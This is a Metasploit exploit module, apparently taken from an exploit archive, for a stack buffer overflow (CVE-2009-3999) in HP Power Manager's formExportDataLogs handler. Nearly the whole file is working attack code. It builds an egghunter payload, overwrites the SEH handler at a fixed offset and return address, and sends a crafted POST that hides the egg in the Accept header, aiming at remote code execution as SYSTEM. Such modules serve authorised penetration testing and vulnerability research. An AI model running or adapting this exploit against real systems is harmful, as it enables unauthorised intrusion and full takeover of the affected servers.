# $Id: hp_power_manager_filename.rb 14016 2011-10-20 17:40:21Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::Egghunter
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;            => "HP Power Manager &#039;formExportDataLogs&#039; Buffer Overflow",
            &#039;Description&#039;     => %q{
                    This module exploits a buffer overflow in HP Power Manager&#039;s &#039;formExportDataLogs&#039;.
                By creating a malformed request specifically for the fileName parameter, a stack-based
                buffer overflow occurs due to a long error message (which contains the fileName),
                which may result aribitrary remote code execution under the context of &#039;SYSTEM&#039;.
            },
            &#039;License&#039;         => MSF_LICENSE,
            &#039;Author&#039;          =>
                [
                    # Original discovery (Secunia Research)
                    &#039;Alin Rad Pop&#039;,
                    # Metasploit module (thx DcLabs members, corelanc0d3r, humble-desser, pyoor)
                    &#039;Rodrigo Escobar <ipax[at]dclabs.com.br>&#039;,
                    # Metasploit fu
                    &#039;sinn3r&#039;
                ],
            &#039;Version&#039;         => &#039;$Revision: 14016 $&#039;,
            &#039;References&#039;      =>
                [
                    [ &#039;CVE&#039;, &#039;2009-3999&#039; ],
                    [ &#039;BID&#039;, &#039;37867&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;ExitFunction&#039; => &#039;thread&#039;,
                },
            &#039;Platform&#039;        => &#039;win&#039;,
            &#039;Payload&#039;         =>
                {
                    &#039;BadChars&#039; => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a",
                    &#039;DisableNops&#039; => true,
                    &#039;EncoderOptions&#039; => {&#039;BufferRegister&#039; => &#039;EDI&#039; }  # Egghunter jmp edi
                },
            &#039;Targets&#039;         =>
                [
                    [
                        # Tested on HP Power Manager 4.2 (Build 7 and 9)
                        &#039;Windows XP SP3 / Win Server 2003 SP0&#039;,
                        {
                            &#039;Ret&#039;    => 0x004174d5,  #pop esi # pop ebx # ret 10 (DevManBE.exe)
                            &#039;Offset&#039; => 721
                        }
                    ]
                ],
            &#039;Privileged&#039;      => false,
            &#039;DisclosureDate&#039;  => &#039;Oct 19 2011&#039;,
            &#039;DefaultTarget&#039;   => 0))
 
        register_options([Opt::RPORT(80)], self.class)
    end
 
    def exploit
        print_status("Generating payload...")
 
        # Randomize the tag by not specifying one
        eggoptions = { :checksum => true }
 
        hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)
 
        buffer  = rand_text_alpha_upper(target[&#039;Offset&#039;] - hunter.length)
        buffer << make_nops(30) + hunter
        buffer << "\xeb\xc2\x90\x90"           #JMP SHORT 0xC2
        buffer << [target.ret].pack(&#039;V*&#039;)[0,3] #SEH (strip the null byte, HP PM will pad it for us)
 
        # Let&#039;s make the request a little bit more realistic looking
        time = Time.new
 
        print_status("Trying target #{target.name}...")
        connect
 
        request = send_request_cgi({
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;uri&#039;       => &#039;/goform/formExportDataLogs&#039;,
            &#039;vars_post&#039; => {
                &#039;dataFormat&#039; => &#039;comma&#039;,
                &#039;exportto&#039;   => &#039;file&#039;,
                &#039;fileName&#039;   => buffer,
                &#039;bMonth&#039;     => "%02d" %time.month,
                &#039;bDay&#039;       => "%02d" %time.day,
                &#039;bYear&#039;      => time.year.to_s,
                &#039;eMonth&#039;     => "%02d" %time.month,
                &#039;eDay&#039;       => "%02d" %time.day,
                &#039;eYear&#039;      => time.year.to_s,
                &#039;LogType&#039;    => &#039;Application&#039;,
                &#039;actionType&#039; => &#039;1%3B&#039;
            },
            &#039;headers&#039; =>
                {
                    &#039;Accept&#039;  => egg,
                    &#039;Referer&#039; => "http://#{rhost}/Contents/exportLogs.asp?logType=Application"
                }
        }, 5)
 
        print_status("Payload sent! Go grab a coffee, the CPU is gonna work hard for you! :)")
 
        # Wait for a bit longer. For some reason it may take some time for the process to start
        # handling our request.
        select(nil, nil, nil, 7)
 
        handler
        disconnect
    end
end



